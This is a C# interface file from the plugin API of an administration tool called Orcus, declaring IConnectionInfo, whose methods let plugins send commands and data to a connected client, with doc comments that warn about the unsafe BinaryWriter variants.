using System;
using System.IO;
using System.Threading.Tasks;
using Orcus.Administration.Plugins.Properties;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;

namespace Orcus.Administration.Plugins.CommandViewPlugin
{
    /// <summary>
    ///     Provides information about the connection
    /// </summary>
    public interface IConnectionInfo
    {
        /// <summary>
        ///     Using the sender, you can directly send things to the server
        /// </summary>
        ISender Sender { get; }

        /// <summary>
        ///     Information about the client
        /// </summary>
        OnlineClientInformation ClientInformation { get; }

        /// <summary>
        ///     Send a command
        /// </summary>
        /// <param name="command">The command you want to send</param>
        /// <param name="data">The data you want to pass with the command</param>
        /// <param name="packageCompression">Decide how the data should be sent</param>
        Task SendCommand(Command command, byte[] data, PackageCompression packageCompression = PackageCompression.Auto);

        /// <summary>
        ///     Send a command
        /// </summary>
        /// <param name="command">The command you want to send</param>
        /// <param name="data">The byte you want to pass with the command</param>
        Task SendCommand(Command command, byte data);

        /// <summary>
        ///     Send a command
        /// </summary>
        /// <param name="command">The command you want to send</param>
        /// <param name="dataInfo">The byte you want to pass with the command</param>
        Task SendCommand(Command command, IDataInfo dataInfo);

        /// <summary>
        ///     Send data using a BinaryWriter. WARNING: This is extremely dangerous if not the same length gets written into the
        ///     stream like set by parameter. Please use the managed way if you are not sure what you are doing
        /// </summary>
        /// <param name="command">The command you want to send</param>
        /// <param name="length">The size of bytes you want to write in the stream</param>
        /// <param name="writerCall">The delegate you should use to write the bytes</param>
        Task UnsafeSendCommand(Command command, int length, [InstantHandle] Action<BinaryWriter> writerCall);

        /// <summary>
        ///     Send data using a BinaryWriter. WARNING: This is extremely dangerous if not the same length gets written into the
        ///     stream like set by parameter. Please use the managed way if you are not sure what you are doing
        /// </summary>
        /// <param name="command">The command you want to send</param>
        /// <param name="writerCall">The call to write the data</param>
        Task UnsafeSendCommand(Command command, WriterCall writerCall);
    }
}